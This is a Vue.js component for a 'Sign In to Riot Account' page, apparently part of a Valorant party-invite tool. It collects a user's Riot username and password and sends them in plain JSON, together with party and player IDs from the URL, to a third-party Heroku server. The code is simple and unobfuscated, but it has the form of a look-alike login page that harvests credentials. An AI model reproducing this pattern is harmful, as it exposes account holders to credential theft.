<template>
  <div class="auth-box">
    <div v-if="success">
      <p class="completed-msg">
        You have been invited to the party. You may now close this webpage.
      </p>
    </div>
    <div v-else>
      <h3 class="auth-header">Sign In to <br />Riot Account</h3>
      <form novalidate>
        <auth-input
          label="Username"
          type="text"
          @on-field-input="updateUsername"
        />
        <auth-input
          label="Password"
          type="password"
          @on-field-input="updatePassword"
        />
      </form>
      <p v-if="error" class="error-msg">{{ errorText }}</p>
      <div class="button-container">
        <button v-if="!this.success && !this.loading" @click="submit" class="login-button">
          Sign In
        </button>
        <loading v-else />
      </div>
    </div>
  </div>
</template>

<script>
import AuthInput from "./AuthInput.vue";
import Loading from "./Loading.vue";
import { useRoute } from "vue-router";

var queryParams;

export default {
  name: "Auth",
  components: { AuthInput, Loading },
  setup() {
    const route = useRoute();
    queryParams = route.query;
  },
  data() {
    return {
      username: "",
      password: "",
      loading: false,
      error: false,
      success: false,
      errorText: "",
    };
  },
  methods: {
    updateUsername(v) {
      this.username = v;
    },
    updatePassword(v) {
      this.password = v;
    },
    submit() {
      this.loading = true;
      this.error = false;
      if (this.username.length == 0 || this.password.length == 0) {
        this.error = true;
        this.errorText = "Invalid username or password";
        this.loading = false;
        return;
      }

      joinParty(this.username, this.password).then((res) => {
        res.text().then((resBody) => {
          if (res.ok) this.success = true;
          else {
            this.success = false;
            this.error = true;
            this.errorText = resBody;
          }
          this.loading = false;
        });
      });
    },
  },
  created() {
    //joinParty(); localhost
  },
};

async function joinParty(username, password) {
  const req = {
    username: username,
    password: password,
    party_id: queryParams.party,
    region: queryParams.region,
    puuid: queryParams.puuid,
  };

  var res = await fetch("https://valorant-invite.herokuapp.com/join", {
    method: "POST",
    body: JSON.stringify(req),
  });

  return res;
}
</script>

<style>
div.auth-box {
  position: absolute;
  left: 50%;
  top: 50%;
  -webkit-transform: translate(-50%, -50%);
  transform: translate(-50%, -50%);

  background-color: #666666;
  border-radius: 15px;
  max-width: 20%;
  width: 20%;
  padding: 2rem;
}

h3.auth-header {
  text-align: center;
  color: whitesmoke;
  font-size: 1.5rem;
  margin: 0;
}

div.button-container {
  margin-top: 30px;
  display: flex;
  align-items: center;
  justify-content: space-around;
}

button.login-button {
  background-color: #ff4655;
  border: none;
  color: whitesmoke;
  padding: 15px 32px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 1rem;
  border-radius: 10px;
}

button.login-button:hover {
  background-color: #ea3241;
}

p.error-msg {
  font-size: 1rem;
  color: red;
  text-align: center;
}

p.completed-msg {
  text-align: center;
  color: whitesmoke;
  font-size: 1.2rem;
  margin: 0;
}

div.spin {
  background-color: #00000020;
  height: 100px;
  width: 100px;
  border-radius: 100px;
  border: 5px solid #00000000;
  border-top: 5px solid #ffffff;
  animation: loading 2s linear infinite;
}
</style>